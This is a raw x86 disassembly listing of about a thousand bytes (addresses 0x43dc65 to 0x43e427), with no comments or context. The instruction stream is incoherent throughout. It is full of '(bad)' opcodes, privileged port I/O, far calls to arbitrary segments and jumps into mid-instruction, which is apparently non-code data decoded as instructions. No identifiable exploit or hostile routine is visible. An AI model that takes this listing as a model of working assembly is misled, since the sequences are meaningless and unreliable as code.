  43dc65:	sub    ebx,DWORD PTR ds:0xc153c69b
  43dc6b:	aaa    
  43dc6c:	int3   
  43dc6d:	aaa    
  43dc6e:	test   al,0xa8
  43dc70:	cmp    DWORD PTR [edi-0x74907e2d],esi
  43dc76:	push   esp
  43dc77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43dc78:	out    dx,eax
  43dc79:	inc    esp
  43dc7a:	xchg   ebx,eax
  43dc7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43dc7c:	sbb    dl,al
  43dc7e:	mov    DWORD PTR ds:0xa8e1f861,edi
  43dc84:	mov    dl,0x35
  43dc86:	mov    ch,BYTE PTR [edx*2+0x5b282f69]
  43dc8d:	push   ebx
  43dc8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43dc8f:	inc    edi
  43dc90:	mov    dl,0xea
  43dc92:	sbb    al,BYTE PTR [ebx+0x2fd59b99]
  43dc98:	les    ebp,FWORD PTR [edi+eax*4]
  43dc9b:	(bad)  
  43dc9d:	mov    edx,ebx
  43dc9f:	pop    esi
  43dca0:	sub    al,0x4a
  43dca2:	mov    eax,ds:0xd40ba723
  43dca7:	repz fs loopne 0x43dcf9
  43dcab:	daa    
  43dcac:	mov    esp,0xc9b79a36
  43dcb1:	adc    DWORD PTR [edi],esp
  43dcb3:	iret   
  43dcb4:	adc    al,0x9d
  43dcb6:	push   ebp
  43dcb7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43dcb8:	lahf   
  43dcb9:	push   esi
  43dcba:	jne    0x43dcc5
  43dcbc:	int    0x41
  43dcbe:	cmp    eax,0xfb7c2bf7
  43dcc3:	imul   esi,DWORD PTR [eax-0xcd157c9],0xe
  43dcca:	aas    
  43dccb:	call   DWORD PTR [bx]
  43dcce:	mov    eax,0x34636fbf
  43dcd3:	ja     0x43dd30
  43dcd5:	popf   
  43dcd6:	loope  0x43dc92
  43dcd8:	mov    dl,0x26
  43dcda:	adc    ebx,DWORD PTR gs:[esi-0x46]
  43dcde:	test   BYTE PTR [eax+esi*4+0xb],dl
  43dce2:	test   DWORD PTR [edi-0x76],edx
  43dce5:	sbb    eax,0x2af27a45
  43dcea:	call   0x332c:0x957e4738
  43dcf1:	push   ecx
  43dcf2:	mov    ah,BYTE PTR [edi-0x29ed0284]
  43dcf8:	cmp    al,0x20
  43dcfa:	pop    ebp
  43dcfb:	add    ebp,DWORD PTR [ebx+eax*1-0x570fcfae]
  43dd02:	cs xor edx,ecx
  43dd05:	jmp    0x43dcee
  43dd07:	xor    al,0x98
  43dd09:	out    dx,eax
  43dd0a:	repz xlat BYTE PTR ds:[ebx]
  43dd0c:	push   0xb
  43dd0e:	and    edi,edi
  43dd10:	int    0xea
  43dd12:	push   esi
  43dd13:	scas   eax,DWORD PTR es:[edi]
  43dd14:	lea    edx,[edx]
  43dd16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43dd17:	mov    bl,0xe7
  43dd19:	add    eax,0xa8cf900f
  43dd1e:	mov    eax,ds:0xc4eabec7
  43dd23:	inc    edi
  43dd24:	add    BYTE PTR [esi],0x9
  43dd27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43dd28:	xchg   ebp,eax
  43dd29:	cmp    bh,BYTE PTR ds:0x71f6313f
  43dd2f:	iret   
  43dd30:	xor    al,BYTE PTR [edx]
  43dd32:	mov    eax,0x4882b262
  43dd37:	adc    esp,esp
  43dd39:	cmp    BYTE PTR [ecx+0x390b0beb],dl
  43dd3f:	das    
  43dd40:	inc    edx
  43dd41:	ja     0x43dd3e
  43dd43:	ins    BYTE PTR es:[edi],dx
  43dd44:	or     bl,dh
  43dd46:	popa   
  43dd47:	jnp    0x43dd9c
  43dd49:	push   eax
  43dd4a:	lahf   
  43dd4b:	xchg   edx,eax
  43dd4c:	pop    ebp
  43dd4d:	adc    al,0x32
  43dd4f:	nop
  43dd50:	xor    cl,BYTE PTR [ebx+0x5]
  43dd53:	repz aaa 
  43dd55:	or     edx,DWORD PTR [ebp-0x6662ca8d]
  43dd5b:	and    eax,0x99ec93a4
  43dd60:	mov    dl,0xff
  43dd62:	cmp    edx,DWORD PTR [edx]
  43dd64:	adc    al,0xed
  43dd66:	ds test esi,eax
  43dd69:	or     ecx,ecx
  43dd6b:	jnp    0x43dd1d
  43dd6d:	dec    ecx
  43dd6e:	inc    edi
  43dd6f:	push   esp
  43dd70:	mov    ds:0xb35e9aa2,eax
  43dd75:	push   esi
  43dd76:	push   ss
  43dd77:	push   eax
  43dd78:	xchg   ebx,eax
  43dd79:	pop    ebp
  43dd7a:	aam    0xdd
  43dd7c:	jo     0x43dd92
  43dd7e:	nop
  43dd7f:	dec    ebp
  43dd80:	or     eax,0xb969d708
  43dd85:	mov    bl,0xa
  43dd87:	fcmovnbe st,st(5)
  43dd89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43dd8a:	popf   
  43dd8b:	lock scas eax,DWORD PTR es:[edi]
  43dd8d:	push   edx
  43dd8e:	imul   ebp,DWORD PTR [edx+esi*1+0x23],0x7457aaf6
  43dd96:	xor    dh,BYTE PTR [edi+ecx*8+0x25ba13c3]
  43dd9d:	les    eax,FWORD PTR [edi+0x6345b2c7]
  43dda3:	mov    cl,0x1
  43dda5:	pop    edi
  43dda6:	call   0x6ead:0xe2261941
  43ddad:	inc    esi
  43ddae:	jo     0x43dd30
  43ddb0:	(bad)  
  43ddb1:	pop    ebx
  43ddb2:	retf   0xb244
  43ddb5:	dec    edi
  43ddb6:	inc    edi
  43ddb7:	jle    0x43ddf7
  43ddb9:	popf   
  43ddba:	mov    ecx,0x292f0592
  43ddbf:	mov    ebp,DWORD PTR ds:0xd70da30b
  43ddc5:	fwait
  43ddc6:	popa   
  43ddc7:	push   edx
  43ddc8:	sub    bh,BYTE PTR [esi-0x4552d566]
  43ddce:	shl    DWORD PTR [eax+0x6c],cl
  43ddd1:	(bad)  
  43ddd2:	mov    BYTE PTR [edi-0x167b62d7],ah
  43ddd8:	and    eax,0xb24b2c63
  43dddd:	mov    al,ds:0xb1ec53c7
  43dde2:	popa   
  43dde3:	call   0x9d045bcc
  43dde8:	mov    ebp,0xbbf82058
  43dded:	aas    
  43ddee:	adc    BYTE PTR [ebp-0x2ee1814e],0xc
  43ddf5:	inc    edx
  43ddf6:	xchg   esp,eax
  43ddf7:	mov    eax,ds:0xe707d629
  43ddfc:	jecxz  0x43de0a
  43ddfe:	mov    ds:0xde0b0234,eax
  43de03:	mov    BYTE PTR [eax-0x2b3a79c8],bl
  43de09:	sub    BYTE PTR [edx+0x485317b6],bl
  43de0f:	shl    cl,cl
  43de11:	jg     0x43de1e
  43de13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43de14:	js     0x43dde4
  43de16:	int3   
  43de17:	pop    ds
  43de18:	test   esp,ebp
  43de1a:	cld    
  43de1b:	mov    edi,0x661179b2
  43de20:	shl    DWORD PTR [edx+0xb044e89],0x94
  43de27:	xchg   ebx,eax
  43de28:	outs   dx,WORD PTR ds:[esi]
  43de2a:	repz inc esp
  43de2c:	adc    esi,DWORD PTR [ecx-0x66]
  43de2f:	out    0xdd,eax
  43de31:	xor    edi,ecx
  43de33:	pop    ss
  43de34:	jecxz  0x43ddd3
  43de36:	icebp  
  43de37:	mov    al,ds:0x5dccc388
  43de3c:	push   ebp
  43de3d:	sbb    ecx,DWORD PTR [ebp-0x651dc08e]
  43de43:	nop
  43de44:	add    eax,0x2deca7af
  43de49:	sub    bh,BYTE PTR [esi-0x59]
  43de4c:	jne    0x43de79
  43de4e:	test   al,0xf6
  43de50:	not    dl
  43de52:	imul   ebp,DWORD PTR ds:0xee3699b2,0xb2624a8c
  43de5c:	dec    ebp
  43de5d:	neg    DWORD PTR [edx]
  43de5f:	fiadd  DWORD PTR [eax+0x7f]
  43de62:	test   eax,0xbdfc36a0
  43de67:	aad    0x8d
  43de69:	push   ebp
  43de6a:	fisubr DWORD PTR [ebx]
  43de6c:	push   ss
  43de6d:	sub    edx,ebx
  43de6f:	fbstp  TBYTE PTR [edx+0x625aa868]
  43de75:	cli    
  43de76:	xlat   BYTE PTR ds:[ebx]
  43de77:	mov    cl,0xc3
  43de79:	or     esp,DWORD PTR [ebx]
  43de7b:	jmp    0x43de27
  43de7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43de7e:	add    esp,DWORD PTR [esi+0x689adefd]
  43de84:	push   esp
  43de85:	retf   
  43de86:	popa   
  43de87:	and    al,BYTE PTR [esi+0x469754cd]
  43de8d:	jnp    0x43de55
  43de8f:	test   eax,0xe39a7992
  43de94:	and    DWORD PTR [edi+ebp*8],esp
  43de97:	mov    ah,0x2
  43de99:	js     0x43def4
  43de9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43de9c:	xchg   ecx,eax
  43de9d:	ret    0x376d
  43dea0:	push   ecx
  43dea1:	repz sub eax,edi
  43dea4:	mov    al,ds:0xb5976491
  43dea9:	inc    DWORD PTR [ecx+edx*2+0x22]
  43dead:	sub    BYTE PTR [ecx],bh
  43deaf:	lea    edi,[ecx-0x78194cf5]
  43deb5:	push   ds
  43deb6:	jne    0x43df23
  43deb8:	loopne 0x43dec2
  43deba:	call   0x63a3:0xbc2edebf
  43dec1:	inc    eax
  43dec2:	mov    eax,0x85ffc8fb
  43dec7:	pop    ss
  43dec8:	pop    ebp
  43dec9:	mov    eax,DWORD PTR [esp+edx*8-0x35]
  43decd:	ja     0x43df3d
  43decf:	test   BYTE PTR [edx-0x55f1cd53],dh
  43ded5:	inc    eax
  43ded6:	dec    ecx
  43ded7:	pusha  
  43ded8:	sbb    DWORD PTR [ebp+eiz*8-0x47],esi
  43dedc:	call   0x83fc8291
  43dee1:	xor    DWORD PTR [edx+0x298f1f25],ebx
  43dee7:	(bad)  
  43dee8:	rep outs dx,DWORD PTR ds:[esi]
  43deea:	call   0x7256:0xdd24eb1b
  43def1:	or     al,0x4e
  43def3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43def4:	push   ds
  43def5:	cmp    BYTE PTR [ebp+edi*2+0x5f9653fa],ch
  43defc:	or     ah,dl
  43defe:	call   0x3165:0x716b4d7
  43df05:	xchg   edi,eax
  43df06:	add    BYTE PTR [eax-0x3c86dc62],ah
  43df0c:	mov    eax,0xb5331aeb
  43df11:	enter  0x9f9a,0x1c
  43df15:	mov    ebx,0x52cf87c4
  43df1a:	sbb    ebx,0x47
  43df1d:	add    eax,0x39cdb74c
  43df22:	cmp    cl,BYTE PTR [eax]
  43df24:	ror    BYTE PTR [edx+ebx*1+0x4be5b22f],cl
  43df2b:	pop    ds
  43df2c:	cwde   
  43df2d:	xchg   ebp,eax
  43df2e:	nop
  43df2f:	aad    0x4c
  43df31:	or     ecx,edi
  43df33:	iret   
  43df34:	scas   eax,DWORD PTR es:[edi]
  43df35:	xor    eax,0x6a7c48d2
  43df3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43df3b:	jnp    0x43df8e
  43df3d:	(bad)  
  43df3e:	dec    esp
  43df3f:	xor    al,0x3e
  43df41:	jo     0x43df5d
  43df43:	cs (bad) 
  43df45:	(bad)  
  43df46:	aam    0xa7
  43df48:	in     eax,0xa0
  43df4a:	cli    
  43df4b:	lods   al,BYTE PTR ds:[esi]
  43df4c:	or     DWORD PTR [edx+ebx*1],edi
  43df4f:	jmp    0x21d1:0xecf18fb1
  43df56:	mov    cl,0x6e
  43df58:	mov    esp,edi
  43df5a:	loop   0x43dfca
  43df5c:	mov    ecx,0x320398bb
  43df61:	inc    esi
  43df62:	leave  
  43df63:	and    al,0xce
  43df65:	cmc    
  43df66:	in     al,0x92
  43df68:	(bad)  
  43df69:	les    esi,FWORD PTR [ecx]
  43df6b:	daa    
  43df6c:	adc    cl,0x7a
  43df6f:	leave  
  43df70:	imul   edx,DWORD PTR [ebp+0xb1cd4e7],0xffffffbe
  43df77:	add    dh,dh
  43df79:	out    dx,al
  43df7a:	in     eax,dx
  43df7b:	xchg   eax,ecx
  43df7d:	push   0xa9f8009a
  43df82:	pop    es
  43df83:	mov    eax,ds:0xa7560a83
  43df88:	ins    DWORD PTR es:[edi],dx
  43df89:	inc    BYTE PTR [ebx+0x2d]
  43df8c:	sar    DWORD PTR [eax+0x3ba5113f],0x87
  43df93:	gs mov dl,0x3e
  43df96:	dec    ecx
  43df97:	pop    ds
  43df98:	or     eax,0xe1a7a110
  43df9d:	loope  0x43dfa9
  43df9f:	jnp    0x43df68
  43dfa1:	push   0x934664af
  43dfa6:	call   0x7284:0x11b6093c
  43dfad:	push   0xffffff9e
  43dfaf:	(bad)  
  43dfb0:	jl     0x43df7c
  43dfb2:	call   0x9afb:0x4f333da8
  43dfb9:	xor    BYTE PTR [edx+0x24ba41b5],bl
  43dfbf:	pop    es
  43dfc0:	mov    ch,0x6d
  43dfc2:	adc    al,0xa7
  43dfc4:	into   
  43dfc5:	in     eax,0x89
  43dfc7:	in     al,0xe1
  43dfc9:	push   cs
  43dfca:	js     0x43e048
  43dfcc:	mov    edx,ds
  43dfce:	shl    BYTE PTR [edi-0x4a7cef78],0x46
  43dfd5:	inc    edx
  43dfd6:	fsub   DWORD PTR [edi+0x1abd305a]
  43dfdc:	dec    edx
  43dfdd:	enter  0x4eee,0xb2
  43dfe1:	cwde   
  43dfe2:	stos   DWORD PTR es:[edi],eax
  43dfe3:	test   eax,0x14929c6e
  43dfe8:	into   
  43dfe9:	or     esp,DWORD PTR [ebp+0x5b8aef1f]
  43dfef:	jg     0x43df77
  43dff1:	lods   al,BYTE PTR ds:[esi]
  43dff2:	call   0xf168:0x1d8d506f
  43dff9:	stos   DWORD PTR es:[edi],eax
  43dffa:	stos   BYTE PTR es:[edi],al
  43dffb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43dffc:	repz cmp eax,0x3a99bf1a
  43e002:	mov    DWORD PTR [eax+esi*4-0x1c],ecx
  43e006:	and    BYTE PTR [edi],cl
  43e008:	rol    BYTE PTR ds:0xd53167d4,cl
  43e00e:	mov    edx,0x221c72b1
  43e013:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43e014:	fistp  QWORD PTR [ecx+edi*2-0x54]
  43e018:	mov    esi,DWORD PTR [esi]
  43e01a:	mov    al,ds:0x5f0b7aaa
  43e01f:	in     al,0x83
  43e021:	test   DWORD PTR [eax],esp
  43e023:	mov    edx,0xe8d30aa7
  43e028:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43e029:	in     al,dx
  43e02a:	or     bl,BYTE PTR [eax]
  43e02c:	cmc    
  43e02d:	fcmovne st,st(2)
  43e02f:	ror    DWORD PTR [edi+0x1aa9704f],1
  43e035:	ret    
  43e036:	cmc    
  43e037:	pop    es
  43e038:	mov    edx,0x3262306
  43e03d:	or     esi,esi
  43e03f:	add    edx,0x27bdb4d9
  43e045:	loopne 0x43dfd4
  43e047:	sbb    eax,0x9b9ad3fd
  43e04c:	or     BYTE PTR [edx+edi*8+0x6a],0x9a
  43e051:	or     edi,DWORD PTR [esp+ecx*1]
  43e054:	aad    0x4a
  43e056:	jbe    0x43e002
  43e058:	mov    eax,0xb286e37b
  43e05d:	jno    0x43dfdf
  43e05f:	adc    ch,dh
  43e061:	adc    al,BYTE PTR [edx]
  43e063:	sub    DWORD PTR [edi+0x17],esi
  43e066:	sahf   
  43e067:	test   DWORD PTR [ecx+0xb],edx
  43e06a:	xchg   BYTE PTR [edi],ah
  43e06c:	mov    al,ds:0xb2a1e233
  43e071:	mov    al,0x57
  43e073:	lds    edx,FWORD PTR [ebx-0x57]
  43e076:	xchg   ebp,eax
  43e077:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  43e079:	jb     0x43e0dc
  43e07b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43e07c:	in     eax,dx
  43e07d:	cdq    
  43e07e:	(bad)  
  43e07f:	or     eax,0x741cd44f
  43e084:	mov    esp,0x87f0ee74
  43e089:	mov    es,WORD PTR [edi-0x65b7f1d8]
  43e08f:	into   
  43e090:	jae    0x43e037
  43e092:	inc    ebx
  43e093:	cmp    dh,BYTE PTR [ebp+0x47]
  43e096:	mov    ds:0xa38b579d,eax
  43e09b:	pop    ecx
  43e09c:	hlt    
  43e09d:	stc    
  43e09e:	and    esi,esi
  43e0a0:	xor    al,0xb
  43e0a2:	int    0x25
  43e0a4:	rcr    DWORD PTR [edi],1
  43e0a6:	dec    ebp
  43e0a7:	fwait
  43e0a8:	cld    
  43e0a9:	sbb    BYTE PTR [edx-0x2f2f16dd],0x63
  43e0b0:	scas   al,BYTE PTR es:[edi]
  43e0b1:	std    
  43e0b2:	aaa    
  43e0b3:	mov    ds:0x65132902,eax
  43e0b8:	mov    esi,0x664a0b8b
  43e0bd:	jecxz  0x43e0a0
  43e0bf:	mov    WORD PTR [edx-0x5ebd0324],?
  43e0c5:	xor    dl,0x5e
  43e0c8:	sub    cl,BYTE PTR [ebx]
  43e0ca:	test   BYTE PTR [ebx*2-0x15861cf1],bh
  43e0d1:	icebp  
  43e0d2:	call   0x336c:0x1f0a87ba
  43e0d9:	lods   al,BYTE PTR ds:[esi]
  43e0da:	lock mov ecx,0x275e5156
  43e0e0:	pop    eax
  43e0e1:	cmc    
  43e0e2:	mov    esi,0x9a84841b
  43e0e7:	retf   
  43e0e8:	xor    al,0xbd
  43e0ea:	fwait
  43e0eb:	lods   al,BYTE PTR ds:[esi]
  43e0ec:	adc    DWORD PTR [ebx-0x4e],edi
  43e0ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43e0f0:	mov    eax,esi
  43e0f2:	add    DWORD PTR [eax-0x2bca508c],edi
  43e0f8:	mov    al,0x7e
  43e0fa:	js     0x43e086
  43e0fc:	push   ebx
  43e0fd:	mov    BYTE PTR [ebp+0x4b13bfe7],cl
  43e103:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43e104:	dec    edi
  43e105:	stos   DWORD PTR es:[edi],eax
  43e106:	push   0x665611b8
  43e10b:	lea    esi,[edx-0x450a48c1]
  43e111:	jmp    0x3c21:0xbc2a48d
  43e118:	ret    
  43e119:	ret    0x85c
  43e11c:	(bad)  
  43e11d:	cdq    
  43e11e:	call   0xdaf:0x145315cd
  43e125:	es ret 
  43e127:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43e128:	mov    esp,0x5974e6fe
  43e12d:	sti    
  43e12e:	test   eax,0x7c14b205
  43e133:	push   ebx
  43e134:	push   edx
  43e135:	cwde   
  43e136:	pop    ds
  43e137:	xor    BYTE PTR [edx],ch
  43e139:	or     ecx,DWORD PTR [esp+ebx*2-0x34]
  43e13d:	mov    al,0xb9
  43e13f:	popf   
  43e140:	or     eax,0xc6339a5f
  43e145:	test   eax,0xa384b1c4
  43e14a:	push   ds
  43e14b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43e14c:	mov    ah,0xda
  43e14e:	out    0x2,al
  43e150:	cdq    
  43e151:	ins    DWORD PTR es:[edi],dx
  43e152:	bound  ebx,QWORD PTR [esi]
  43e154:	mov    al,ds:0x8ae39a43
  43e159:	pop    esi
  43e15a:	push   eax
  43e15b:	stos   BYTE PTR es:[edi],al
  43e15c:	dec    ecx
  43e15d:	sahf   
  43e15e:	adc    BYTE PTR [edi+0x63f28bff],ah
  43e164:	push   ss
  43e165:	pop    ecx
  43e166:	push   ecx
  43e167:	sbb    ecx,eax
  43e169:	cli    
  43e16a:	call   0x7b59:0x622af80
  43e171:	xor    edx,DWORD PTR [edi-0x1cacb859]
  43e177:	arpl   di,cx
  43e179:	gs mov dl,0xdd
  43e17c:	mov    dl,0x77
  43e17e:	xor    eax,0xc452b482
  43e183:	jae    0x43e189
  43e185:	or     edi,DWORD PTR [ebx-0x6]
  43e188:	dec    ebx
  43e189:	icebp  
  43e18a:	rcr    dh,1
  43e18c:	(bad)  
  43e18d:	ss call 0x9b67:0x1676eec9
  43e195:	sahf   
  43e196:	or     al,BYTE PTR [ecx-0x5815ea5e]
  43e19c:	rcl    BYTE PTR [edx+0x576d0661],1
  43e1a2:	fwait
  43e1a3:	jl     0x43e173
  43e1a5:	mov    ebp,0x953ddda9
  43e1aa:	push   edx
  43e1ab:	xlat   BYTE PTR ds:[ebx]
  43e1ac:	push   0xf
  43e1ae:	mov    ds:0xf5405fa5,al
  43e1b3:	daa    
  43e1b4:	mov    esi,0xb23ea76c
  43e1b9:	push   esi
  43e1ba:	into   
  43e1bb:	adc    esp,edx
  43e1bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43e1be:	loop   0x43e16e
  43e1c0:	xor    eax,0x9ec42a0b
  43e1c5:	sub    eax,0xffffffa9
  43e1c8:	xchg   edi,eax
  43e1c9:	cli    
  43e1ca:	xchg   esp,eax
  43e1cb:	(bad)  
  43e1cc:	lods   al,BYTE PTR ds:[esi]
  43e1cd:	das    
  43e1ce:	into   
  43e1cf:	addr16 addr16 loope 0x43e250
  43e1d3:	adc    eax,0x41480b66
  43e1d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43e1d9:	jmp    0xeff7c6c8
  43e1de:	mov    WORD PTR [edi+0x7b],fs
  43e1e1:	sub    eax,0x8d7d959a
  43e1e6:	lea    eax,ds:0x4b6b0b47
  43e1ec:	cmp    DWORD PTR [ecx+0x0],edx
  43e1ef:	inc    ebp
  43e1f0:	aaa    
  43e1f1:	scas   al,BYTE PTR es:[edi]
  43e1f2:	call   0x24ef:0x5dadc493
  43e1f9:	lea    edi,[edx-0x5b]
  43e1fc:	ret    
  43e1fd:	ins    DWORD PTR es:[edi],dx
  43e1fe:	add    DWORD PTR [edi+edi*8-0x12],esi
  43e202:	cli    
  43e203:	nop
  43e204:	push   ss
  43e205:	xor    eax,0xf4c459d
  43e20a:	xchg   esi,eax
  43e20b:	bound  esi,QWORD PTR [edx-0x5432bb44]
  43e211:	add    eax,0x71561f06
  43e216:	call   0x8a97:0xab8e7fd1
  43e21d:	sub    al,0xcc
  43e21f:	daa    
  43e220:	or     ebx,DWORD PTR [edi+edi*2+0x45]
  43e224:	dec    ecx
  43e225:	arpl   WORD PTR [eax],ax
  43e227:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43e228:	aam    0x1b
  43e22a:	jnp    0x43e1fa
  43e22c:	outs   dx,BYTE PTR ds:[esi]
  43e22d:	addr16 jb 0x43e1f7
  43e230:	fwait
  43e231:	retf   
  43e232:	ret    0xc00c
  43e235:	or     esi,DWORD PTR ds:0xaa5e2b9d
  43e23b:	push   esp
  43e23c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43e23d:	or     esi,DWORD PTR [eax-0x7577ea24]
  43e243:	test   eax,0x929a2c09
  43e248:	inc    BYTE PTR [edi+0x2b000e81]
  43e24e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43e250:	jbe    0x43e24d
  43e252:	enter  0xd8e4,0xb6
  43e256:	jmp    0xaa83:0xab4bb24d
  43e25d:	inc    esi
  43e25e:	or     al,0x1c
  43e260:	xchg   DWORD PTR [ebx],ecx
  43e262:	jg     0x43e207
  43e264:	xor    DWORD PTR [edi],esi
  43e266:	dec    esi
  43e267:	idiv   DWORD PTR [ebx+0x61469afd]
  43e26d:	sub    DWORD PTR [ebx+eiz*2-0x58d95991],edx
  43e274:	push   DWORD PTR [ebx-0x23]
  43e277:	adc    eax,0x25d1e728
  43e27c:	mov    dl,0x3
  43e27e:	add    eax,0x780d34d2
  43e283:	pop    eax
  43e284:	sbb    DWORD PTR [edx],eax
  43e286:	(bad)  
  43e287:	scas   al,BYTE PTR es:[edi]
  43e288:	not    BYTE PTR [ebp+0x1a]
  43e28b:	jb     0x43e21f
  43e28d:	add    al,0x75
  43e28f:	mov    al,0x8c
  43e291:	das    
  43e292:	call   0x20bdbd
  43e297:	xchg   ecx,eax
  43e298:	and    ecx,0xffffffea
  43e29b:	push   edi
  43e29c:	ror    BYTE PTR [ebx],cl
  43e29e:	int3   
  43e29f:	sub    ch,ch
  43e2a1:	mov    eax,0xd8d4297d
  43e2a6:	xchg   ebx,eax
  43e2a7:	sbb    al,0x56
  43e2a9:	xchg   edi,eax
  43e2aa:	xor    DWORD PTR [edi-0x35368f9e],esp
  43e2b0:	adc    eax,0x33a96b0b
  43e2b5:	outs   dx,BYTE PTR ds:[esi]
  43e2b6:	jne    0x43e242
  43e2b8:	adc    DWORD PTR [eax-0x4015aa66],0xffffffad
  43e2bf:	repz in al,dx
  43e2c1:	cmp    al,dl
  43e2c3:	dec    ebp
  43e2c4:	push   0x9
  43e2c6:	ds pop es
  43e2c8:	and    ebx,DWORD PTR [ecx]
  43e2ca:	mov    al,0x67
  43e2cc:	push   edx
  43e2cd:	xchg   ecx,eax
  43e2ce:	sub    eax,0x1deab23a
  43e2d3:	xchg   DWORD PTR [ecx-0x3f6ce81a],edx
  43e2d9:	or     ebp,DWORD PTR [edi]
  43e2db:	int    0x0
  43e2dd:	sbb    DWORD PTR [eax-0x65dfe98e],0xb8d55421
  43e2e7:	jge    0x43e2e1
  43e2e9:	call   0x889a8077
  43e2ee:	sbb    ah,BYTE PTR [eax-0x1a5af735]
  43e2f4:	xchg   esp,eax
  43e2f5:	sub    edi,DWORD PTR [ebx+esi*2+0x6c9de957]
  43e2fc:	sbb    al,0xb0
  43e2fe:	fisub  DWORD PTR [edx+edi*8]
  43e301:	nop
  43e302:	sub    DWORD PTR [ebp-0x4193be92],esp
  43e308:	add    ecx,DWORD PTR ds:0x5d2a7ef
  43e30e:	jne    0x43e2db
  43e310:	pop    esp
  43e311:	or     edi,DWORD PTR [esi]
  43e313:	leave  
  43e314:	in     eax,dx
  43e315:	pop    es
  43e316:	inc    esi
  43e317:	daa    
  43e318:	sysenter 
  43e31a:	fwait
  43e31b:	js     0x43e2a2
  43e31d:	mov    cl,0x30
  43e31f:	cmp    al,0x33
  43e321:	mov    eax,0xe80a856
  43e326:	add    eax,0x4277bbe2
  43e32b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43e32c:	daa    
  43e32d:	je     0x43e380
  43e32f:	inc    esi
  43e330:	sub    al,0x20
  43e332:	call   0x5090:0x38185b60
  43e339:	mov    edi,0x6796a7b5
  43e33e:	sbb    eax,0x1275d7e5
  43e343:	test   DWORD PTR [esi+0x7391d3cc],ebp
  43e349:	inc    esp
  43e34a:	loope  0x43e350
  43e34c:	mov    bl,0x91
  43e34e:	pop    ebx
  43e34f:	fdiv   st,st(2)
  43e351:	xlat   BYTE PTR ds:[ebx]
  43e352:	es jne 0x43e35c
  43e355:	or     edi,DWORD PTR [ecx+edi*1+0x5e]
  43e359:	jmp    0x22e701ef
  43e35e:	sahf   
  43e35f:	shl    DWORD PTR [esi+ebx*1+0x5273afae],cl
  43e366:	pop    edi
  43e367:	pop    edx
  43e368:	ret    0x24fa
  43e36b:	mov    al,ds:0x9c435507
  43e370:	sub    eax,0x46704c7b
  43e375:	pop    eax
  43e376:	call   0x62b0:0xb5d4e392
  43e37d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43e37e:	out    0xb0,eax
  43e380:	pusha  
  43e381:	mov    ebp,0x443ea621
  43e386:	ins    DWORD PTR es:[edi],dx
  43e387:	mov    bl,0x33
  43e389:	jmp    0x43e3fa
  43e38b:	les    esi,FWORD PTR [edx-0x4fe54585]
  43e391:	clc    
  43e392:	xor    eax,0xc6edf4fe
  43e397:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43e398:	ds sbb eax,0x2af58ff8
  43e39e:	stc    
  43e39f:	jecxz  0x43e3cb
  43e3a1:	loop   0x43e40a
  43e3a3:	xchg   DWORD PTR [edx-0x7dbcfbe9],esi
  43e3a9:	add    bh,cl
  43e3ab:	add    ecx,DWORD PTR [esi-0x15588513]
  43e3b1:	sbb    BYTE PTR [eax-0x3cbbb632],al
  43e3b7:	jmp    0xcf79:0x4d3b0cb0
  43e3be:	sub    al,BYTE PTR [edi-0x2f]
  43e3c1:	cmp    esp,ebx
  43e3c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43e3c4:	dec    esi
  43e3c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43e3c6:	test   al,0x44
  43e3c8:	in     eax,0x90
  43e3ca:	enter  0xb2fb,0x9f
  43e3ce:	jge    0x43e36a
  43e3d0:	mov    bl,0x53
  43e3d2:	shr    DWORD PTR [ebp+0x6e],0xb
  43e3d6:	(bad)
  43e3d9:	imul   esi,DWORD PTR es:[ecx+0x5d9a7704],0xa4d992ca
  43e3e4:	shr    DWORD PTR ss:[ecx-0x45abf77d],0xa7
  43e3ec:	ins    BYTE PTR es:[edi],dx
  43e3ed:	aam    0xae
  43e3ef:	imul   ebx,DWORD PTR [esi-0xc736592],0x66
  43e3f6:	out    dx,al
  43e3f7:	stc    
  43e3f8:	aam    0x1c
  43e3fa:	icebp  
  43e3fb:	push   ebp
  43e3fc:	mov    eax,ds:0x56ea080a
  43e401:	xchg   BYTE PTR [edi+0x1a],ch
  43e404:	mov    ah,0xef
  43e406:	cmp    al,0x69
  43e408:	mov    ebp,0x7bb0023b
  43e40d:	jmp    0x43e3d4
  43e40f:	stos   BYTE PTR es:[edi],al
  43e410:	loop   0x43e3c2
  43e412:	in     eax,0x99
  43e414:	test   al,0xa8
  43e416:	sbb    dh,BYTE PTR [ebp-0x526c1ee5]
  43e41c:	out    dx,eax
  43e41d:	das    
  43e41e:	in     al,0xf5
  43e420:	jmp    0x9bc4:0x92bb2715
  43e427:	push   ss
